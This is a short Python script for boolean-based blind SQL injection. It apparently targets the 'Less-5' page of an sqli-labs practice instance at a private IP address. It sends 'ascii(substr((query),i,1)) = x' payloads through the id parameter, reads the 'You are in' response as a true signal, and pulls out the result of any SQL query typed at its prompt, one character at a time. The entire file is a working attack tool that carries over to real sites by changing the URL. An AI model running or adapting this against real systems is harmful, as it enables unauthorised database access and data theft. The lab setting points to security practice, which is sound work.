import requests

OKMsg = ["You are in"]
FailedMsg = None
CommandFailed = ["error in your SQL syntax"]

def check(url):
    #print("> " + url)
    return_txt = requests.get(url).text
    
    if not (FailedMsg is None) : 
        for afailedmsg in FailedMsg:
            if (return_txt.find (afailedmsg) != -1):
                return False,0

    for afailedmsg in CommandFailed:
        if (return_txt.find (afailedmsg) != -1):
            return False,-1

    for aokmsg in OKMsg:
        if (return_txt.find (aokmsg) != -1):
            return True,0
    return False,0

def runcommand(command):
    guessed_str = ""
    for index in range(1,100):
        founded = False

        for x in range(0,128):
            req_url = "http://192.168.19.174:32772/Less-5/index.php?id=0' or ascii(substr((%s),%s,1)) = %s -- -" % (command,index,x)
            checkwork,code = check(req_url)
            if code == -1: guessed_str="Run command failed, pls check command !"; break;
            if checkwork :
                guessed_str +=chr(x)
                founded = True
                if (x == 0):
                    founded = False
                print(guessed_str)
                continue

        if not founded:
            print("---------------------- Result --------------------")
            print(command)
            print("--------------------------------------------------")
            print(guessed_str)
            print("--------------------------------------------------")
            break
while True:
    runcommand(input("$ "))
